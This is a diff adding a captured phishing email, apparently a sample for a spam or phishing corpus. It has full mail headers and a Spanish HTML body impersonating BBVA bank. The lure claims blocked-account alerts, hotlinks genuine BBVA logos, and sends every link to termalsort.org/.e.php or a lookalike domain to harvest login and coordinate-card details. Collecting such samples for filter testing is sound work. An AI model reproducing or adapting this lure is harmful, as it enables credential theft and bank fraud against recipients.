@@ -1,0 +1,119 @@
+X-Account-Key: account2
+Return-path: <asterisk@example.com>
+Envelope-to: hostmaster@uvigo.es
+Delivery-date: Mon, 25 Jan 2010 10:40:06 +0100
+Received: from mail.uvigo.es ([193.146.32.69] helo=grelo.uvigo.es)
+	by cacahuete.uvigo.es with esmtps (TLS1.0:DHE_RSA_AES_256_CBC_SHA1:32)
+	(Exim 4.69)
+	(envelope-from <asterisk@example.com>)
+	id 1NZLQS-000478-NL
+	for hostmaster@uvigo.es; Mon, 25 Jan 2010 10:40:05 +0100
+Received: from cogumelo.uvigo.es (antispam1.uvigo.es [193.146.32.120])
+	by grelo.uvigo.es (8.13.8/8.13.8/Debian-3) with ESMTP id o0P9e0t2020582
+	(version=TLSv1/SSLv3 cipher=AES256-SHA bits=256 verify=NOT)
+	for <hostmaster@uvigo.es>; Mon, 25 Jan 2010 10:40:04 +0100
+Received: from [69.160.241.123] (helo=yb-server.example.com)
+	by cogumelo.uvigo.es with esmtp (Exim 4.69)
+	(envelope-from <asterisk@example.com>)
+	id 1NZKyO-0002Xp-Bg
+	for hostmaster@uvigo.es; Mon, 25 Jan 2010 10:11:04 +0100
+Received: by yb-server.example.com (Postfix, from userid 100)
+	id D82665A3CD57; Mon, 25 Jan 2010 06:09:07 +0000 (GMT)
+To: hostmaster@uvigo.es
+From: noticia.bbva@bbva-grupo.net
+Content-Type: text/html
+Message-Id: <20100125060907.D82665A3CD57@yb-server.example.com>
+Date: Mon, 25 Jan 2010 06:09:07 +0000 (GMT)
+X-Spam-Flag: No
+X-Spam-Checker-Version: SpamAssassin 3.2.5 (2008-06-10) on cogumelo.uvigo.es
+X-Spam-Status: No, score=2.8 required=5.0 tests=BAYES_00,DATE_IN_PAST_03_06,
+	DNS_FROM_RFC_DSN,HTML_IMAGE_ONLY_32,HTML_MESSAGE,MIME_HEADER_CTYPE_ONLY,
+	MIME_HTML_ONLY,RDNS_NONE autolearn=no version=3.2.5
+X-Spam-UVIGO-Status: No, score=2.8 required=5.0 tests=BAYES_00=-2.599,
+	DATE_IN_PAST_03_06=0.044,DNS_FROM_RFC_DSN=1.495,HTML_IMAGE_ONLY_32=1.778,
+	HTML_MESSAGE=0.001,MIME_HEADER_CTYPE_ONLY=0.56,MIME_HTML_ONLY=1.457,
+	RDNS_NONE=0.1 autolearn=no version=3.2.5
+X-Spam-UVIGO-Level: **
+X-Spam-UVIGO: No
+X-Spam-UVIGO-Score: _SCOREINT_
+Subject: BBVA Seguridad - Acceso no autorizado a su cuenta !
+X-Mail-Scanned: Criba + Clamd smtp.uvigo.es
+X-SA-Exim-Connect-IP: 193.146.32.69
+X-SA-Exim-Mail-From: asterisk@example.com
+X-SA-Exim-Scanned: No (on cacahuete.uvigo.es); SAEximRunCond expanded to false
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
+<html xmlns="http://www.w3.org/1999/xhtml"> 
+<head> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+<title>Estimado Cliente</title> 
+<style type="text/css"> 
+<!--
+body,td,th {
+        font-size: large;
+}
+-->
+</style></head> 
+ 
+<body> 
+<p><a href="http://www.bbva.es.w-sc.net/TLBS/tlbs/jsp/esp/home/index.jsp" TARGET="_blank"><img 
+src="http://www.bbva.es/TLBS/fbin/bbva_logo_tcm11-13047.gif" width="200"
+height="59" longdesc="https://www.bbva.es" /></a> 
+  <a href="http://termalsort.org/.e.php" TARGET="_blank"><img 
+src="http://www.bbva.es/TLBS/fbin/ROMPE_Imagen_Impacto_tcm11-203763.gif"
+width="545" height="100" longdesc="https://www.bbva.es" /></a> 
+</p> 
+<p><b>Estimado Cliente de BBVA,</b></p> 
+<p><strong> </strong>Nuestro equipo de seguridad ha detectado varios intentos de <br /> 
+ acceso no autorizado a su cuenta de BBVA desde el ip 66.252.1.76<br /> 
+  Los intentos de acceder a su cuenta no han tenido &eacute;xito.<br /> 
+  Como medida de seguridad nuestro sistema ha bloqueado su cuenta temporalmente.<br /> 
+  Para desbloquear su cuenta, usted debe ingresar a su cuenta desde<br /> 
+
+su ip y confirmar su identidad con su tarjeta de coordenadas.</p> 
+<p>Si usted no tiene su tarjeta de coordenadas, no es necesario seguir este paso.<br /> 
+  Nuestro equipo de seguridad se pondr&aacute; en contacto con usted por tel&eacute;fono.</p> 
+<p>Una vez que su identidad ha sido confirmada el acceso<br /> 
+a su cuenta ser&aacute; restaurado inmediatamente.</p> 
+<p></p> 
+<p><b>Entrar ahora en la  <a href="http://termalsort.org/.e.php" TARGET="_blank">oficina de BBVA</a>  para restaurar su 
+cuenta :</b></p> 
+
+<p>&nbsp;</p> 
+<p> <a href="http://termalsort.org/.e.php" TARGET="_blank"><img src="http://www.bbvanetoffice.com/mult/logo_nuevo.gif" 
+width="256"
+height="32" longdesc="https://www.bbva.es" /></a></p> 
+<p> <a href="http://termalsort.org/.e.php" TARGET="_blank"><img 
+src="http://www.bbvanetoffice.com/mult/tj-coordenadas-bbvanet-office.png" width="334" height="178" /></a></p> 
+<p><b>AVISO DE SEGURIDAD :</b></p> 
+<p>Si recibe un correo en el que le piden sus datos de BBVA net Office<br /> 
+BBVA nunca env&iacute;a mensajes solicitando esta informaci&oacute;n.</p> 
+<p>En BBVA trabajamos constantemente para garantizar la confidencialidad de las comunicaciones entre el Banco y el cliente
+  <!--$$--> 
+.</p> 
+
+<ul> 
+  <li> 
+    <!--$$--> 
+    Que el cliente est&aacute; comunicando sus datos al centro servidor de BBVA y no a cualquier otro que intentara hacerse pasar por &eacute;ste
+    <!--$$--> 
+  . </li> 
+  <li> 
+    <!--$$--> 
+    Que  entre el cliente y el centro servidor de BBVA los datos viajan cifrados, evitando su posible lectura o manipulaci&oacute;n por terceros
+    <!--$$--> 
+    . <br /> 
+
+</li> 
+</ul> 
+<p><b>&iexcl;Recuerde! BBVA nunca le pedir&aacute; su identificaci&oacute;n personal.</b></p> 
+<p><br /> 
+  <strong>Comisionado para la Defensa del Cliente de Servicios Bancarios</strong><br /> 
+  Servicio de Reclamaciones <br /> 
+  Alcal&aacute; 48, 28014 Madrid</p> 
+</body> 
+
+</html> 
+
+
